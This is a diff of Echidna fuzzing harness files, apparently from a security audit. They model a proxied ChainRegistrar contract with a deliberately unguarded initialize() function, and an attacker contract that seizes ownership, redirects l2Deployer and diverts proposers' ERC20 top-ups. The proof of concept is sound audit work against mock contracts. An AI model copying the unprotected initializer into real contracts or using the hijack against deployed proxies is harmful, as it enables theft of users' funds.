@@ -1,0 +1,244 @@
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_era_contracts_f1_chain_registrar_init_hijack/src/EchidnaEraContractsF1ChainRegistrarInitHijackHarness.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity 0.8.24;
+  3 |     | 
+  4 |     | import {
+  5 |     |     EraContractsF1SimpleProxy,
+  6 |     |     ChainRegistrarLike,
+  7 |     |     ChainRegistrarInitAttacker,
+  8 |     |     IChainRegistrarLike,
+  9 |     |     MockERC20
+ 10 |     | } from "./EraContractsF1ChainRegistrarInitHijackHarness.sol";
+ 11 |     | 
+ 12 |     | /// @notice Echidna harness for ChainRegistrar initializer takeover and top-up diversion.
+ 13 | *   | contract EchidnaEraContractsF1ChainRegistrarInitHijackHarness {
+ 14 |     |     EraContractsF1SimpleProxy public proxy;
+ 15 |     |     IChainRegistrarLike public registrar;
+ 16 |     |     ChainRegistrarInitAttacker public attacker;
+ 17 |     |     MockERC20 public token;
+ 18 |     | 
+ 19 |     |     address public attackerCollector;
+ 20 |     | 
+ 21 | *   |     constructor() {
+ 22 | *   |         attackerCollector = address(0xCAFE);
+ 23 |     | 
+ 24 | *   |         ChainRegistrarLike implementation = new ChainRegistrarLike();
+ 25 | *   |         proxy = new EraContractsF1SimpleProxy(address(this));
+ 26 | *   |         proxy.upgradeTo(address(implementation));
+ 27 | *   |         registrar = IChainRegistrarLike(address(proxy));
+ 28 | *   |         attacker = new ChainRegistrarInitAttacker();
+ 29 |     | 
+ 30 | *   |         token = new MockERC20();
+ 31 | *   |         token.mint(address(this), 100 ether);
+ 32 | *   |         token.approve(address(proxy), type(uint256).max);
+ 33 |     |     }
+ 34 |     | 
+ 35 | *   |     function action_attacker_initialize() public {
+ 36 | *   |         try attacker.hijack(address(proxy), address(0xB0B), address(0xD3E10F), address(attacker)) {} catch {}
+ 37 |     |     }
+ 38 |     | 
+ 39 | *   |     function action_attacker_change_deployer() public {
+ 40 | *   |         if (registrar.owner() != address(attacker)) {
+ 41 | *   |             return;
+ 42 |     |         }
+ 43 | *   |         try attacker.changeDeployer(address(proxy), attackerCollector) {} catch {}
+ 44 |     |     }
+ 45 |     | 
+ 46 | *   |     function action_victim_propose_non_eth() public {
+ 47 | *   |         try registrar.proposeChainRegistration(7, address(token), 10, 1) {} catch {}
+ 48 |     |     }
+ 49 |     | 
+ 50 |     |     function echidna_attacker_cannot_receive_proposer_topup() public view returns (bool) {
+ 51 |     |         return token.balanceOf(attackerCollector) == 0;
+ 52 |     |     }
+ 53 |     | }
+ 54 |     | 
+
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_era_contracts_f1_chain_registrar_init_hijack/src/EraContractsF1ChainRegistrarInitHijackHarness.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | pragma solidity 0.8.24;
+   3 |     | 
+   4 |     | interface IERC20Like {
+   5 |     |     function balanceOf(address account) external view returns (uint256);
+   6 |     |     function transferFrom(address from, address to, uint256 amount) external returns (bool);
+   7 |     |     function approve(address spender, uint256 amount) external returns (bool);
+   8 |     | }
+   9 |     | 
+  10 |     | interface IChainRegistrarLike {
+  11 |     |     function initialize(address _bridgehub, address _l2Deployer, address _owner) external;
+  12 |     |     function owner() external view returns (address);
+  13 |     |     function l2Deployer() external view returns (address);
+  14 |     |     function changeDeployer(address _newDeployer) external;
+  15 |     |     function proposeChainRegistration(
+  16 |     |         uint256 _chainId,
+  17 |     |         address _baseTokenAddress,
+  18 |     |         uint128 _gasPriceMultiplierNominator,
+  19 |     |         uint128 _gasPriceMultiplierDenominator
+  20 |     |     ) external;
+  21 |     | }
+  22 |     | 
+  23 |     | /// @notice Minimal proxy with unstructured storage to avoid implementation slot collisions.
+  24 | *   | contract EraContractsF1SimpleProxy {
+  25 |     |     bytes32 private constant IMPLEMENTATION_SLOT =
+  26 | *   |         bytes32(uint256(keccak256("era.contracts.f1.proxy.implementation")) - 1);
+  27 | *   |     bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("era.contracts.f1.proxy.admin")) - 1);
+  28 |     | 
+  29 |     |     error Unauthorized();
+  30 |     |     error ImplementationNotSet();
+  31 |     | 
+  32 | *   |     constructor(address admin_) {
+  33 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  34 | *   |         assembly {
+  35 | *   |             sstore(adminSlot, admin_)
+  36 |     |         }
+  37 |     |     }
+  38 |     | 
+  39 | *   |     function admin() public view returns (address admin_) {
+  40 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  41 | *   |         assembly {
+  42 | *   |             admin_ := sload(adminSlot)
+  43 |     |         }
+  44 |     |     }
+  45 |     | 
+  46 | *   |     function implementation() public view returns (address implementation_) {
+  47 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  48 | *   |         assembly {
+  49 | *   |             implementation_ := sload(implementationSlot)
+  50 |     |         }
+  51 |     |     }
+  52 |     | 
+  53 | *   |     function upgradeTo(address implementation_) external {
+  54 | *   |         if (msg.sender != admin()) revert Unauthorized();
+  55 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  56 | *   |         assembly {
+  57 | *   |             sstore(implementationSlot, implementation_)
+  58 |     |         }
+  59 |     |     }
+  60 |     | 
+  61 |     |     fallback() external payable {
+  62 | *   |         _delegate();
+  63 |     |     }
+  64 |     | 
+  65 |     |     receive() external payable {}
+  66 |     | 
+  67 | *   |     function _delegate() internal {
+  68 | *   |         address impl = implementation();
+  69 | *   |         if (impl == address(0)) revert ImplementationNotSet();
+  70 |     |         assembly {
+  71 | *   |             calldatacopy(0, 0, calldatasize())
+  72 | *   |             let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+  73 | *   |             returndatacopy(0, 0, returndatasize())
+  74 | *   |             switch result
+  75 | *   |             case 0 { revert(0, returndatasize()) }
+  76 | *   |             default { return(0, returndatasize()) }
+  77 |     |         }
+  78 |     |     }
+  79 |     | }
+  80 |     | 
+  81 |     | /// @notice Minimal ERC20 to model proposer top-up flow in ChainRegistrar.
+  82 | *   | contract MockERC20 {
+  83 |     |     string public constant name = "MockToken";
+  84 |     |     string public constant symbol = "MOCK";
+  85 |     |     uint8 public constant decimals = 18;
+  86 |     | 
+  87 | *   |     mapping(address => uint256) public balanceOf;
+  88 |     |     mapping(address => mapping(address => uint256)) public allowance;
+  89 |     | 
+  90 | *   |     function mint(address to, uint256 amount) external {
+  91 | *   |         balanceOf[to] += amount;
+  92 |     |     }
+  93 |     | 
+  94 | *   |     function approve(address spender, uint256 amount) external returns (bool) {
+  95 | *   |         allowance[msg.sender][spender] = amount;
+  96 | *   |         return true;
+  97 |     |     }
+  98 |     | 
+  99 | *   |     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+ 100 | *   |         uint256 allowed = allowance[from][msg.sender];
+ 101 | *   |         require(allowed >= amount, "insufficient allowance");
+ 102 | *   |         require(balanceOf[from] >= amount, "insufficient balance");
+ 103 |     | 
+ 104 | *   |         if (allowed != type(uint256).max) {
+ 105 |     |             allowance[from][msg.sender] = allowed - amount;
+ 106 |     |         }
+ 107 |     | 
+ 108 | *   |         balanceOf[from] -= amount;
+ 109 | *   |         balanceOf[to] += amount;
+ 110 | *   |         return true;
+ 111 |     |     }
+ 112 |     | }
+ 113 |     | 
+ 114 |     | /// @notice ChainRegistrar model preserving bug parity:
+ 115 |     | ///         `initialize(...)` is external-first-caller with no caller authorization guard.
+ 116 |     | ///         `changeDeployer(...)` is owner-gated and influences proposer ERC20 top-ups.
+ 117 | *   | contract ChainRegistrarLike {
+ 118 | *   |     address internal constant ETH_TOKEN_ADDRESS = address(1);
+ 119 |     | 
+ 120 |     |     bool internal initialized;
+ 121 |     |     address internal _owner;
+ 122 |     |     address public l2Deployer;
+ 123 |     |     address public bridgehub;
+ 124 |     | 
+ 125 |     |     mapping(address author => mapping(uint256 chainId => bool proposed)) public proposed;
+ 126 |     | 
+ 127 |     |     error AlreadyInitialized();
+ 128 |     |     error Unauthorized();
+ 129 |     |     error ChainIsAlreadyProposed();
+ 130 |     | 
+ 131 | *   |     constructor() {
+ 132 |     |         // Bug parity with implementation constructor calling `_disableInitializers`.
+ 133 | *   |         initialized = true;
+ 134 |     |     }
+ 135 |     | 
+ 136 | *   |     function owner() external view returns (address) {
+ 137 | *   |         return _owner;
+ 138 |     |     }
+ 139 |     | 
+ 140 | *   |     function initialize(address _bridgehub, address _l2Deployer, address _ownerAddress) external {
+ 141 | *   |         if (initialized) revert AlreadyInitialized();
+ 142 | *   |         initialized = true;
+ 143 | *   |         bridgehub = _bridgehub;
+ 144 | *   |         l2Deployer = _l2Deployer;
+ 145 | *   |         _owner = _ownerAddress;
+ 146 |     |     }
+ 147 |     | 
+ 148 |     |     modifier onlyOwner() {
+ 149 | *   |         if (msg.sender != _owner) revert Unauthorized();
+ 150 |     |         _;
+ 151 |     |     }
+ 152 |     | 
+ 153 | *   |     function changeDeployer(address _newDeployer) external onlyOwner {
+ 154 | *   |         l2Deployer = _newDeployer;
+ 155 |     |     }
+ 156 |     | 
+ 157 | *   |     function proposeChainRegistration(
+ 158 |     |         uint256 _chainId,
+ 159 |     |         address _baseTokenAddress,
+ 160 |     |         uint128 _gasPriceMultiplierNominator,
+ 161 |     |         uint128 _gasPriceMultiplierDenominator
+ 162 |     |     ) external {
+ 163 | *   |         if (proposed[msg.sender][_chainId]) revert ChainIsAlreadyProposed();
+ 164 | *   |         proposed[msg.sender][_chainId] = true;
+ 165 |     | 
+ 166 | *   |         if (_baseTokenAddress != ETH_TOKEN_ADDRESS) {
+ 167 | *   |             uint256 amount = (1 ether * uint256(_gasPriceMultiplierNominator)) / uint256(_gasPriceMultiplierDenominator);
+ 168 | *   |             if (IERC20Like(_baseTokenAddress).balanceOf(l2Deployer) < amount) {
+ 169 | *   |                 bool ok = IERC20Like(_baseTokenAddress).transferFrom(msg.sender, l2Deployer, amount);
+ 170 | *   |                 require(ok, "transferFrom failed");
+ 171 |     |             }
+ 172 |     |         }
+ 173 |     |     }
+ 174 |     | }
+ 175 |     | 
+ 176 |     | /// @notice Helper that performs attacker first-call initialization and owner-only deployer change.
+ 177 | *   | contract ChainRegistrarInitAttacker {
+ 178 | *   |     function hijack(address proxy, address bridgehub, address seededL2Deployer, address attackerOwner) external {
+ 179 | *   |         IChainRegistrarLike(proxy).initialize(bridgehub, seededL2Deployer, attackerOwner);
+ 180 |     |     }
+ 181 |     | 
+ 182 | *   |     function changeDeployer(address proxy, address newDeployer) external {
+ 183 | *   |         IChainRegistrarLike(proxy).changeDeployer(newDeployer);
+ 184 |     |     }
+ 185 |     | }
+ 186 |     | 
+
